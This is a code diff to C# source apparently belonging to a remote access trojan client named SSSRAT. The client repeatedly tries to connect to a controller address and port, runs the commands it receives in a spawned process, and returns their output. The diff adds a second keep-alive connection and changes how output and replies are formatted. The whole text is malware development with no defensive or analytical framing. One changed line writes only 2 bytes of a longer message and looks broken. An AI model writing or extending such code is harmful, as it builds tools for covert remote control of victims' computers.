@@ -10,6 +10,7 @@ namespace SSSRAT {
 		static TcpClient client;
 		const string MASTER_ADDR = "127.0.0.1";
 		const int PORT = 13337;
+		const int KA_PORT = 13338;
 		const string AUTH = "empty";
 		const int MAX_BUFFER = 8192;
 		const string SPLITTER = "{_$}";
@@ -19,8 +20,7 @@ namespace SSSRAT {
 			while (!client.Connected) {
 				try {
 					client.Connect(MASTER_ADDR, PORT);
-				} catch {
-				}
+				} catch { }
 				Thread.Sleep(2000);
 			}
 			byte[] recv = Recv(5);
@@ -42,6 +42,17 @@ namespace SSSRAT {
 				return;
 			}
 			new Thread(Commands).Start();
+			new Thread(KeepAlive).Start();
+		}
+
+		public static void KeepAlive() {
+			var kaClient = new TcpClient();
+			kaClient.Connect(MASTER_ADDR, KA_PORT);
+			var stm = kaClient.GetStream();
+			while (true) {
+				var readBuff = new byte[2];
+				stm.Read(readBuff, 0, 2);
+			}
 		}
 
 		public static bool Send(byte[] data, NetworkStream stm = null, int offset = 0, int size = -1) {
@@ -64,7 +75,7 @@ namespace SSSRAT {
 			try {
 				if (stm == null)
 					stm = client.GetStream();
-				stm.Read(buffer, offset, size);
+					stm.Read(buffer, offset, size);
 				return buffer;
 			} catch {
 				client.Close();
@@ -102,7 +113,7 @@ namespace SSSRAT {
 					};
 					var proc = new Process();
 					var stdout = new StringBuilder();
-					proc.OutputDataReceived += (sender, e) => stdout.Append(e.Data);
+					proc.OutputDataReceived += (sender, e) => stdout.Append(e.Data + "\r\n");
 					proc.StartInfo = procStartInfo;
 					proc.Start();
 					proc.BeginOutputReadLine();
@@ -110,7 +121,7 @@ namespace SSSRAT {
 					proc.CancelOutputRead();
 					Send(GB(stdout.ToString()));
 				} else if (command == "KA") {
-					Send(GB("ON"));
+					client.GetStream().Write(GB("KA" + SPLITTER + "ON"), 0, 2);
 				}
 				Thread.Sleep(1);
 			}
